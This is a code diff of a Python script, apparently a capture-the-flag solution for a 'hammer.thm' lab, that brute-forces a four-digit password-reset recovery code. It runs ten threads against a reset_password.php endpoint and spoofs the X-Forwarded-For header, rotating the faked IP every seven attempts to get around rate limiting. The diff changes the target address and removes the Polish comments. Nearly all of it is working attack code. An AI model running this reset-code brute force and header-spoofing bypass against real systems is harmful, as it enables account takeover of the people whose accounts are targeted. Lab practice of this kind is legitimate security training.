@@ -1,23 +1,18 @@
 import requests
 import threading
 
-# Konfiguracja
-BASE_URL = "http://10.10.132.180:1337"
+BASE_URL = "http://10.10.232.105:1337"
 RESET_URL = f"{BASE_URL}/reset_password.php"
-NUM_THREADS = 10  # Liczba wątków
-ATTEMPTS_PER_IP = 7  # Liczba prób przed zmianą IP
+NUM_THREADS = 10
+ATTEMPTS_PER_IP = 7
 
-# Flaga zatrzymująca brute-force, gdy kod zostanie znaleziony
 found = False
 found_lock = threading.Lock()
 
-# Rozpoczęcie sesji
 session = requests.Session()
 
-# Pobranie ciasteczek sesyjnych
 session.get(BASE_URL)
 
-# Wysłanie prośby o reset hasła
 session.post(RESET_URL, data={"email": "tester@hammer.thm"})
 
 
@@ -25,14 +20,13 @@ def brute_force(thread_id, start_code, step):
     """Funkcja brute-force iterująca po kodach z odpowiednim zakresem."""
     global found
 
-    ip_suffix = thread_id  # Każdy wątek startuje z innym adresem IP
-    attempts = 0  # Licznik prób przed zmianą IP
-    code = start_code  # Każdy wątek zaczyna od innego kodu
+    ip_suffix = thread_id
+    attempts = 0
+    code = start_code
 
     while not found:
-        # Formatowanie kodu jako 4-cyfrowy
         code_str = f"{code:04d}"
-        headers = {"X-Forwarded-For": f"127.0.0.{ip_suffix}"}  # IP w X-Forwarded-For
+        headers = {"X-Forwarded-For": f"127.0.0.{ip_suffix}"}
 
         try:
             response = session.post(RESET_URL, data={"recovery_code": code_str, "s": "178"}, headers=headers)
@@ -42,14 +36,14 @@ def brute_force(thread_id, start_code, step):
             if "Invalid or expired" in response.text:
                 attempts += 1
                 if attempts >= ATTEMPTS_PER_IP:
-                    attempts = 0  # Reset liczby prób
-                    ip_suffix += NUM_THREADS  # Zwiększamy IP o liczbę wątków, aby uniknąć konfliktów
+                    attempts = 0
+                    ip_suffix += NUM_THREADS
 
-                code += step  # Przeskok do następnego kodu w zakresie wątku
+                code += step
 
             else:
                 with found_lock:
-                    if not found:  # Zapobiega wielokrotnemu wypisywaniu sukcesu
+                    if not found:
                         found = True
                         print("\n" + "=" * 40)
                         print(f"[*] TOKEN FOUND by Thread-{thread_id}!!!!!")
@@ -62,16 +56,13 @@ def brute_force(thread_id, start_code, step):
             print(f"[!] Error in Thread-{thread_id}: {e}")
             break
 
-
-# Tworzenie i uruchamianie wątków
 threads = []
 for t in range(NUM_THREADS):
-    start_code = t  # Każdy wątek zaczyna od innego kodu
+    start_code = t
     thread = threading.Thread(target=brute_force, args=(t, start_code, NUM_THREADS))
     threads.append(thread)
     thread.start()
 
-# Czekanie na zakończenie wszystkich wątków
 for thread in threads:
     thread.join()
 
